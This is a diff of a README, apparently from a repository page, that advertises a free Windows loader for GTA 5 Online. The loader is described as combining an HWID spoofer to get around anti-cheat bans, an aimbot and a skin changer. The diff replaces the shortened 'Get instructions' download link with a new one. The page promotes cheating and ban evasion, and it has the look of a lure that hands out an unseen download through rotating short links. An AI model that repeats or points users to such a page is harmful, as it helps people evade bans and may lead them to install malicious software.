@@ -5,7 +5,7 @@
 **GTA 5 Online** — HWID spoofer, aimbot and skin changer in one Windows loader. The spoofer resets the hardware ID Rockstar AC banned, the aimbot is fully configurable, and the skin changer unlocks cosmetics client-side. **Free download, Windows 10 and 11.**
 
 <p align="center">
-  <a href="https://share.google/juLze9VronZqzWVtP"><img src="button.svg" alt="Get instructions" height="46"></a>
+  <a href="https://share.google/M5PsclTVQqpcmYIY3"><img src="button.svg" alt="Get instructions" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
